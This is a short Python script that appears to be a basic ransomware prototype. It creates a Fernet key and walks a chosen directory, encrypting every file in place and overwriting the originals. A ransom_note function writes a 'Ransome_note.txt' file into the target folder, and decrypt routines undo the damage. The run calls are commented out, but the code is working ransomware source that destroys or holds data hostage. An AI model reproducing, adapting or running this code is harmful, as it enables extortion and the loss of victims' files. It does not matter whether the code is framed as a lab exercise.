from cryptography.fernet import Fernet
import os

# Set the absolute path to the key file based on this script's location
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))
KEY_FILE_PATH = os.path.join(BASE_DIR, "keyfile.key")

# Generate & save encryption key
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE_PATH, "wb") as keyfile:
        keyfile.write(key)

# Load key
def load_key():
    return open(KEY_FILE_PATH, "rb").read()

# Encrypt a file
def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Encrypt all files in directory
def encrypt_directory(directory):
    key = load_key()
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
            print(f"Encrypted: {file_path}")

# Run
#generate_key()
#encrypt_directory("target") 

def ransom_note(path, note):
    note_path = str(path) + ".ransome_note"

    ransom_note = str(note)
    target_dir = path if os.path.isdir(path) else os.path.dirname(path)

    note_path = os.path.join(target_dir, "Ransome_note.txt")
    with open(note_path, "w") as file:
        file.write(ransom_note)
    print(f"📄 Ransom note created at: {note_path}")


def decrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

def decrypt_directory(directory):
    key = load_key()
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)
            print(f"Decrypted: {file_path}")

# decrypt_directory("target")

